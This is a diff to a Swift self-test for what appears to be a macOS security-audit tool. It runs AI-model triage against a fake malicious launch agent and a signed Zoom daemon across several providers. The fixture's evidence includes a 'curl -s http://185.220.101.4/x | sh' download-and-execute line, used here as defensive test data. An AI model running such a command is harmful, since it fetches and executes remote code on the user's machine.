@@ -181,8 +181,17 @@ enum SelfTest {
             check(v.count == items.count, "every candidate got a verdict")
         }
 
-        if arguments.contains("--bedrock") {
-            print("Bedrock (\(BedrockClient().model))")
+        // Live fixture triage, opt-in per provider: --bedrock, --anthropic, --openai <base-url> <model>.
+        var liveModels: [any ToolModel] = []
+        if arguments.contains("--bedrock") { liveModels.append(BedrockClient()) }
+        if arguments.contains("--anthropic"), let key = InferenceKeys.resolve(.anthropic) {
+            liveModels.append(AnthropicClient(model: InferenceProvider.anthropic.models[0].0, key: key))
+        }
+        if let i = arguments.firstIndex(of: "--openai"), arguments.indices.contains(i + 2), let base = URL(string: arguments[i + 1]) {
+            liveModels.append(OpenAICompatibleClient(model: arguments[i + 2], baseURL: base, key: InferenceKeys.resolve(.openai)))
+        }
+        for client in liveModels {
+            print("Live triage (\(client.model))")
             let fake = AuditItem(id: "persistence:~/Library/LaunchAgents/com.evil.updater.plist", kind: .persistence, title: "com.evil.updater",
                                    evidence: ["plist: ~/Library/LaunchAgents/com.evil.updater.plist", "runs: /bin/sh -c curl -s http://185.220.101.4/x | sh",
                                               "signer: Apple (that is /bin/sh itself; the payload is downloaded)", "starts at login/boot", "created 2 hours ago"],
@@ -191,15 +200,15 @@ enum SelfTest {
                                    evidence: ["plist: /Library/LaunchDaemons/us.zoom.ZoomDaemon.plist", "runs: /Library/PrivilegedHelperTools/us.zoom.ZoomDaemon",
                                               "signer: Developer (BJ4HAAB9B3)", "starts at login/boot and is kept alive"])
             do {
-                let outcome = AuditTriage.triage([fake, zoom], client: BedrockClient())
+                let outcome = AuditTriage.triage([fake, zoom], client: client)
                 if let e = outcome.errors.first { throw AWSError(message: e) }
                 let (v, usage) = (outcome.verdicts, outcome.usage)
                 for o in [fake, zoom] { print("    \(o.title): \(v[o.id].map { "\($0.call.rawValue)/\($0.severity.label) — \($0.rationale)" } ?? "missing")") }
                 print("    tokens: \(usage.input) in / \(usage.output) out")
-                check(v[fake.id].map { $0.call != .benign && $0.severity >= .medium } ?? false, "Haiku flags curl|sh launch agent")
-                check(v[zoom.id]?.call != .confirmed, "Haiku doesn't flag signed Zoom daemon")
+                check(v[fake.id].map { $0.call != .benign && $0.severity >= .medium } ?? false, "\(client.model) flags curl|sh launch agent")
+                check(v[zoom.id]?.call != .confirmed, "\(client.model) doesn't flag signed Zoom daemon")
             } catch {
-                check(false, "Bedrock call failed: \(error.localizedDescription)")
+                check(false, "\(client.model) call failed: \(error.localizedDescription)")
             }
         }
 
